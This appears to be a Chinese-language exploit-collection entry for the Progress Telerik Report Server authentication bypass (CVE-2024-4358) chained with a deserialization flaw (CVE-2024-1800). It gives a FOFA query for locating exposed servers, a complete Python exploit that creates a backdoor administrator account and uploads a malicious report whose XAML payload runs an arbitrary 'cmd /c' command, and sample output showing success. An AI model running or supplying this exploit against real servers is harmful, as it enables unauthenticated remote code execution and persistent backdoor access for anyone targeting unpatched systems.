## Progress-Telerik-Report-Server身份验证绕过(CVE-2024-4358)

在 IIS 上的 Progress Telerik Report Server 版本 2024 Q1 (10.0.24.305) 或更早版本中，未经身份验证的攻击者可以通过身份验证绕过漏洞获取对 Telerik Report Server 受限功能的访问权限。

## fofa

```
app="Telerik-Report-Server"
```

## exp

```python
"""
Progress Telerik Report Server pre-authenticated RCE chain (CVE-2024-4358/CVE-2024-1800)
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
Technical details: https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/
"""
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import zipfile
import base64
import random
import argparse



def saveCredentials(username, password):
    print
    with open('credentials.txt', 'a') as file:
        print("(+) Saving credentials to credentials.txt")
        file.write(f'(*) {args.target} {username}:{password}\n')

def authBypassExploit(username, password):
    print("(*) Attempting to bypass authentication")
    res = s.post(f"{args.target}/Startup/Register", data={"Username": username, "Password": password, "ConfirmPassword": password, "Email": f"{username}@{username}.com", "FirstName": username, "LastName": username})
    
    if(res.url == f"{args.target}/Report/Index"):
        print("(+) Authentication bypass was successful, backdoor account created")
        saveCredentials(username, password)

    else:
        print("(!) Authentication bypass failed, result was: ")
        print(res.text)
        exit(1)
    

def createCategory():
    categoryName = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
    print(f"(*) Creating category under random name {categoryName}")

    res = s.post(f"{args.target}/Category/Create", json={"sort": None,"group": None, "filter":None, "Id":None,"Name":categoryName,"ReportsCount":0,"CanModify":False,"CanDelete":False,"CategoryId":None})
    if(res.status_code != 200):
        print("(!) Category creation failed, result was: ")
        print(res.text)
        exit(1)
    return categoryName

def deserializationExploit(serializedPayload, authorizationToken):
    reportName = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
    print(f"(*) Generated random report name: {reportName}")
    categoryName = createCategory()
    print(f"(*) Creating malicious report under name {reportName}")
    res = s.post(f"{args.target}/api/reportserver/report", headers={"Authorization" : f"Bearer {authorizationToken}"}, json={"reportName":reportName,"categoryName":categoryName,"description":None,"reportContent":serializedPayload,"extension":".trdp"})
    if(res.status_code != 200):
        print("(!) Report creation failed, result was: ")
        print(res.text)
        exit(1)
        
    res = s.post(f"{args.target}/api/reports/clients", json={"timeStamp":None})
    if(res.status_code != 200):
        print("(!) Fetching clientID failed, result was: ")
        print(res.text)
        exit(1)
    clientID = res.json()['clientId']
    
    
    
    res = s.post(f"{args.target}/api/reports/clients/{clientID}/parameters", json={"report":f"NAME/{categoryName}/{reportName}/","parameterValues":{}})
    print("(*) Deserialization exploit finished")

def login(username, password):
    res = s.post(f"{args.target}/Token",data={"grant_type": "password","username":username, "password": password})
    if(res.status_code != 200):
        print("(!) Authentication failed, result was: ")
        print(res.text)
        exit(1)
    
    print(f"(+) Successfully authenticated as {username} with password {password}")
    print("(*) got token: " + res.json()['access_token'])
    return res.json()['access_token']



def readAndEncode(file_path):
    with open(file_path, 'rb') as file:
        encoded = base64.b64encode(file.read()).decode('utf-8')
    return encoded


def writePayload(payload_name):
    with zipfile.ZipFile(payload_name, 'w') as zipf:
        
        zipf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="utf-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/zip" /></Types>''')
        
        zipf.writestr("definition.xml", f'''<Report Width="6.5in" Name="oooo"
	xmlns="http://schemas.telerik.com/reporting/2012/2">
	<Items>
		<ResourceDictionary
			xmlns="clr-namespace:System.Windows;Assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
			xmlns:System="clr-namespace:System;assembly:mscorlib"
			xmlns:Diag="clr-namespace:System.Diagnostics;assembly:System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
			xmlns:ODP="clr-namespace:System.Windows.Data;Assembly:PresentationFramework, Version=4.0.0.0, Culture=neutral,    
PublicKeyToken=31bf3856ad364e35"
  >
			<ODP:ObjectDataProvider MethodName="Start" >
				<ObjectInstance>
					<Diag:Process>
						<StartInfo>
							<Diag:ProcessStartInfo FileName="cmd" Arguments="/c {args.command}"></Diag:ProcessStartInfo>
						</StartInfo>
					</Diag:Process>
				</ObjectInstance>
			</ODP:ObjectDataProvider>
		</ResourceDictionary>
	</Items>''')



def banner():
    print('''(^_^) Progress Telerik Report Server pre-authenticated RCE chain (CVE-2024-4358/CVE-2024-1800) || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)''')


output_filename = 'exploit.trdp'


banner()



parser = argparse.ArgumentParser(usage=r'python CVE-2024-4358.py --target http://192.168.1.1:83 -c "whoami > C:\pwned.txt"')
parser.add_argument('--target', '-t', dest='target', help='Target IP and port (e.g: http://192.168.1.1:83)', required=True)
parser.add_argument('--command', '-c', dest='command', help='Command to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')



s = requests.Session()
s.verify = False

randomUsername = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
randomPassword = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
print("(*) random backdoor username: " + randomUsername)
print("(*) random backdoor password: " + randomPassword)
authBypassExploit(randomUsername, randomPassword)
authorizationToken = login(randomUsername, randomPassword)

writePayload(output_filename)
deserializationExploit(readAndEncode(output_filename).strip(), authorizationToken)
```

用法

```
python CVE-2024-4358.py --target http://192.168.253.128:83 -c "whoami"

(^_^) Progress Telerik Report Server pre-authenticated RCE (CVE-2024-4358/CVE-2024-1800) || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
(*) random backdoor username: oelycslyun
(*) random backdoor password: cqgnacxljo
(*) Attempting to bypass authentication
(+) Authentication bypass was successful, backdoor account created
(+) Saving credentials to credentials.txt
(+) Successfully authenticated as oelycslyun with password cqgnacxljo
(*) got token: zfCch_LNv0PyKfe7eBDYKXV70IOotwNQ2p82aX-JHIMCisVnTW9PWWYUKljhcRw5alubNOg_gXoHT6-hJk4VO-jGZuzmisLIi5A
(*) Generated random report name: qvwdycugmc
(*) Creating malicious report under name qvwdycugmc
(*) Deserialization exploit finished
```



## 漏洞来源

- https://github.com/sinsinology/CVE-2024-4358